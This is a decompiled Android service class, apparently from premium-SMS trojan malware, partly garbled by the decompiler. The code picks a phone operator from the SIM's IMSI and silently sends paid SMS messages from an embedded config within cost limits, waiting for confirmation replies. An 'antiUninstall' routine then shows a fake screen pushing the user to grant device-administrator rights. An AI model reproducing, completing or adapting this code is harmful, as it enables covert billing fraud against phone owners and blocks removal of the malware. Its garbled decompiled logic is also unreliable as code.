package install.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import java.io.PrintStream;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService
  extends Service
  implements ThreadOperationListener
{
  public static boolean working = false;
  
  public MainService() {}
  
  static JSONObject operator()
  {
    JSONObject localJSONObject3;
    label149:
    Object localObject;
    for (JSONObject localJSONObject1 = null;; localObject = localJSONObject3)
    {
      int i;
      try
      {
        JSONArray localJSONArray1 = new JSONObject(Constants.data).getJSONArray("operators");
        i = 0;
        if (i >= localJSONArray1.length())
        {
          if (localJSONObject1 != null) {
            return localJSONObject1;
          }
        }
        else
        {
          JSONObject localJSONObject2 = localJSONArray1.getJSONObject(i);
          JSONArray localJSONArray2 = localJSONObject2.getJSONArray("codes");
          int j = 0;
          for (;;)
          {
            if (j >= localJSONArray2.length())
            {
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.has("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.getBoolean("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (localJSONObject1 != null) {
                break label149;
              }
              localJSONObject3 = localJSONObject2;
              break label149;
            }
            boolean bool = Constants.imsi.startsWith(localJSONArray2.getString(j));
            localJSONObject3 = localJSONObject2;
            if (bool) {
              break;
            }
            j += 1;
          }
        }
        return localJSONObject3;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        localJSONObject3 = new JSONObject();
      }
      i += 1;
    }
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    if (Constants.DEBUG) {
      System.out.println("MainService::start() key: " + paramString);
    }
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    paramContext.startService(localIntent);
  }
  
  private void waitSms(int paramInt)
  {
    int i = 0;
    for (;;)
    {
      if (i >= paramInt) {}
      do
      {
        return;
        SystemClock.sleep(Constants.SECOND);
      } while (Settings.ok);
      i += 1;
    }
  }
  
  long loadTime(String paramString)
  {
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size()) {
        return 0L;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString)) {
        return ((Operator)localObject2).time;
      }
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public void onDestroy() {}
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    paramIntent = paramIntent.getExtras();
    if ((paramIntent != null) && (paramIntent.get("key") != null))
    {
      paramIntent = (String)paramIntent.get("key");
      if (Constants.DEBUG) {
        System.out.println("MainService::onStart() key: " + paramIntent);
      }
      if (paramIntent.equals("pay")) {
        new Thread(new ThreadOperation(this, 1, null)).start();
      }
    }
  }
  
  void saveTime(String paramString)
  {
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size())
      {
        localObject2 = new Operator();
        ((Operator)localObject2).name = paramString;
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).operators.add(localObject2);
        return;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString))
      {
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).save(this);
        return;
      }
      i += 1;
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    if (Constants.DEBUG) {
      System.out.println("threadOperationRun: " + paramInt);
    }
    if ((paramInt != 1) || (working)) {
      return;
    }
    working = true;
    paramObject = ((PowerManager)getSystemService("power")).newWakeLock(1, "Service");
    paramObject.acquire();
    try
    {
      localJSONObject1 = new JSONObject(Constants.data).getJSONObject("settings");
      localObject2 = operator();
      localObject1 = ((JSONObject)localObject2).getString("name");
      long l1 = System.currentTimeMillis();
      paramInt = ((JSONObject)localObject2).getInt("repeat");
      long l2 = loadTime((String)localObject1);
      if (Constants.DEBUG)
      {
        System.out.println("name: " + (String)localObject1);
        System.out.println("now: " + l1);
        System.out.println("repeat: " + paramInt);
        System.out.println("time: " + l2);
      }
      if (Constants.MINUTE * paramInt + l2 > l1) {
        break label297;
      }
      paramInt = ((JSONObject)localObject2).getInt("mode");
      if (!Constants.DEBUG) {
        break label827;
      }
      System.out.println("start sms: mode = " + paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        JSONObject localJSONObject1;
        Object localObject2;
        Object localObject1;
        int i;
        int j;
        int n;
        int m;
        int k;
        localException.printStackTrace();
        continue;
        if ((paramInt != 1) && (paramInt != 41)) {
          if (paramInt != 2) {
            if (paramInt == 42)
            {
              continue;
              paramInt = n + 1;
              i = m;
              j = k;
            }
          }
        }
      }
    }
    localObject1 = ((JSONObject)localObject2).getJSONArray("sms");
    paramInt = 0;
    if (paramInt >= ((JSONArray)localObject1).length()) {
      label297:
      if (localJSONObject1.has("simpleSms"))
      {
        localObject1 = localJSONObject1.getJSONObject("simpleSms");
        if (((JSONObject)localObject1).getBoolean("enable"))
        {
          SystemClock.sleep(((JSONObject)localObject1).getInt("wait") * Constants.SECOND);
          localObject1 = ((JSONObject)localObject1).getJSONArray("sms");
          paramInt = 0;
        }
      }
    }
    for (;;)
    {
      if (paramInt >= ((JSONArray)localObject1).length())
      {
        if (localJSONObject1.has("antiUninstall"))
        {
          localJSONObject1 = localJSONObject1.getJSONObject("antiUninstall");
          if (localJSONObject1.getBoolean("enable"))
          {
            SystemClock.sleep(localJSONObject1.getInt("wait") * Constants.SECOND);
            FakeActivity.text = localJSONObject1.getString("text");
            FakeActivity.repeat = localJSONObject1.getBoolean("repeat");
            Settings.showAdmin(this, FakeActivity.class);
          }
        }
        working = false;
        paramObject.release();
        return;
        localObject2 = ((JSONArray)localObject1).getJSONObject(paramInt);
        Settings.sendSms(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text"));
        SystemClock.sleep(localJSONObject1.getInt("smsTimeout") * Constants.SECOND);
        paramInt += 1;
        break;
        i = ((JSONObject)localObject2).getInt("maxCost");
        j = ((JSONObject)localObject2).getInt("maxSms");
        if (Constants.DEBUG) {
          System.out.println("maxCost = " + i);
        }
        localObject2 = ((JSONObject)localObject2).getJSONArray("sms");
        paramInt = 0;
        if (paramInt >= ((JSONArray)localObject2).length()) {
          break label297;
        }
        JSONObject localJSONObject2 = ((JSONArray)localObject2).getJSONObject(paramInt);
        int i1 = localJSONObject2.getInt("cost");
        if (Constants.DEBUG) {
          System.out.println("sms cost = " + i1);
        }
        n = paramInt;
        m = i;
        k = j;
        if (j <= 0) {
          break label855;
        }
        n = paramInt;
        m = i;
        k = j;
        if (i - i1 <= 0) {
          break label855;
        }
        saveTime((String)localObject1);
        JSONObject localJSONObject3 = localJSONObject2.getJSONObject("wait");
        Settings.phone = localJSONObject3.getString("phone");
        Settings.text = localJSONObject3.getString("text");
        Settings.ok = false;
        Settings.sendSms(localJSONObject2.getString("phone"), localJSONObject2.getString("text"));
        waitSms(localJSONObject3.getInt("time"));
        n = paramInt;
        m = i;
        k = j;
        if (Settings.ok)
        {
          Settings.ok = false;
          k = j - 1;
          m = i - i1;
          n = paramInt - 1;
        }
        SystemClock.sleep(localJSONObject1.getInt("smsTimeout") * Constants.SECOND);
        break label855;
      }
      localObject2 = ((JSONArray)localObject1).getJSONObject(paramInt);
      Settings.sendSms(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text"));
      paramInt += 1;
    }
  }
}
